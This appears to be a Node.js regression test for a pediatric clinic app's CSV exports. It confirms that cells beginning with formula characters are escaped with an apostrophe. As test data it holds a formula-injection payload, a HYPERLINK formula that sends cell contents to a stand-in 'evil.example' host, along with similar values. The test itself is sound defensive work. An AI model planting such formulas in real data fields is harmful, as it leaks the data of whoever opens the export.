// CSV exports do not carry spreadsheet formulas (PEDIATRICIAN_BUGS.md #24).
//
// The pediatrician's CSV exports (GET /api/pedia-reports/export.csv and the My
// Patients export) quoted every cell but did nothing about a text cell that
// starts with = + - @: Excel and Sheets run that as a formula whatever the
// quoting. A parent chooses the child's name, so a child named
// =HYPERLINK("http://evil/?"&A1,"Open") ran when the clinician opened the file.
// Such cells now get a leading apostrophe and show as text.
//
// No DB, no browser: the server's cell function is exercised directly, and the
// real My Patients script runs in a node vm with a tiny fake DOM.
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const mongoose = require('mongoose');

mongoose.set('bufferCommands', false);
process.env.EMAIL_USER = '';
process.env.EMAIL_PASS = '';

const router = require('../../routes/pedia-reports');
const { csvCell, csvRow } = router._internals;

const ROOT = path.join(__dirname, '..', '..');
const results = [];
const ok = (m) => results.push(m);

const FORMULA = '=HYPERLINK("http://evil.example/?"&A1,"Open")';

// ── Server ────────────────────────────────────────────────────────────────
for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
  assert.strictEqual(csvCell(`${lead}1+1`), `"'${lead}1+1"`, `a cell starting with ${JSON.stringify(lead)} is neutralised`);
}
assert.strictEqual(csvCell(FORMULA), `"'=HYPERLINK(""http://evil.example/?""&A1,""Open"")"`, 'the formula is neutralised and its quotes still doubled');
assert.strictEqual(csvCell('Maria Santos'), '"Maria Santos"', 'an ordinary name is unchanged');
assert.strictEqual(csvCell("O'Brien"), `"O'Brien"`, 'an apostrophe inside a name is unchanged');
assert.strictEqual(csvCell('Sam =Lee'), '"Sam =Lee"', 'only a LEADING character matters');
assert.strictEqual(csvCell('2030-01-08T00:00:00.000Z'), '"2030-01-08T00:00:00.000Z"', 'ISO dates start with a digit');
assert.strictEqual(csvCell(55), '"55"', 'numbers are not text');
assert.strictEqual(csvCell(-5), '"-5"', 'a real negative number is left alone');
assert.strictEqual(csvCell(null), '""');
assert.strictEqual(csvCell(undefined), '""');
assert.strictEqual(csvRow(['Kemri', FORMULA, 80]), `"Kemri","'=HYPERLINK(""http://evil.example/?""&A1,""Open"")","80"`);
ok('the pedia-reports export neutralises =, +, -, @, tab and carriage-return leads, and leaves names, dates and numbers alone');

// ── My Patients export ────────────────────────────────────────────────────
const els = new Map();
const el = (id) => {
  if (!els.has(id)) {
    els.set(id, {
      id, value: '', textContent: '', innerHTML: '', src: '', href: '', disabled: false, style: {}, dataset: {},
      addEventListener() {}, classList: { add() {}, remove() {}, toggle() {} },
      closest: () => null, querySelector: () => null, querySelectorAll: () => [],
    });
  }
  return els.get(id);
};
const anchors = [];
const sandbox = {
  console, URLSearchParams, URL, JSON, Number, String, Promise, Date, Math, encodeURIComponent, decodeURIComponent,
  setTimeout: () => 0, setInterval: () => 0, clearInterval() {}, alert(msg) { sandbox.alerted = msg; }, confirm: () => false,
  localStorage: {
    getItem: (k) => ({ kc_token: 't', kc_user: JSON.stringify({ role: 'pediatrician', firstName: 'Ana', lastName: 'Cruz', id: 'u1' }) }[k] ?? null),
    setItem() {}, removeItem() {}, clear() {},
  },
  document: {
    getElementById: el, querySelector: () => null, querySelectorAll: () => [], addEventListener() {}, body: { contains: () => true },
    createElement: () => { const a = { href: '', download: '', click() { this.clicked = true; } }; anchors.push(a); return a; },
  },
  fetch: () => new Promise(() => {}),
  KC: { poll: () => ({ stop() {} }) },
  addEventListener() {},
  loadNotificationCount: async () => {},
};
sandbox.window = sandbox;
sandbox.location = { origin: 'http://localhost', href: '', search: '' };
vm.createContext(sandbox);
for (const file of ['constants/scoring.js', 'js/shared/care-plan-labels.js', 'js/pedia/pediatrician-patients.js']) {
  vm.runInContext(fs.readFileSync(path.join(ROOT, file), 'utf8'), sandbox);
}
sandbox.__patients = [
  { childFirstName: '=HYPERLINK("http://evil.example/?"&A1,"Open")', childLastName: 'Soto', parentFirstName: '@SUM(1+1)', parentLastName: 'Cruz',
    childDateOfBirth: '2024-01-01', appointmentStatus: 'approved', diagnosis: 'x', overallScore: 61.4 },
  { childFirstName: 'Maria', childLastName: 'Santos', parentFirstName: 'Ana', parentLastName: 'Reyes',
    childDateOfBirth: '2024-01-01', appointmentStatus: '-cancelled', diagnosis: null, overallScore: null },
];
vm.runInContext('_allPatients = __patients; exportPatients();', sandbox);
assert.strictEqual(anchors.length, 1, 'a file was produced');
const csv = decodeURIComponent(anchors[0].href.replace('data:text/csv;charset=utf-8,', ''));
const lines = csv.split('\r\n');
assert.strictEqual(lines.length, 3);
assert(lines[1].startsWith(`"'=HYPERLINK(""http://evil.example/?""&A1,""Open"") Soto","'@SUM(1+1) Cruz",`), lines[1]);
assert(lines[1].endsWith(',"Yes","61%"'), lines[1]);
assert(lines[2].startsWith('"Maria Santos","Ana Reyes",'), 'ordinary rows are unchanged');
assert(lines[2].includes(`,"'-cancelled",`), 'a status text starting with - is neutralised too');
assert(lines[2].endsWith(',"No","—"'), lines[2]);
ok('the My Patients export neutralises a child or parent name that starts with a formula character');

console.log(results.map((m) => `  ✓ ${m}`).join('\n'));
console.log(`\ncsv-formula-injection.test.js: ${results.length} checks passed`);
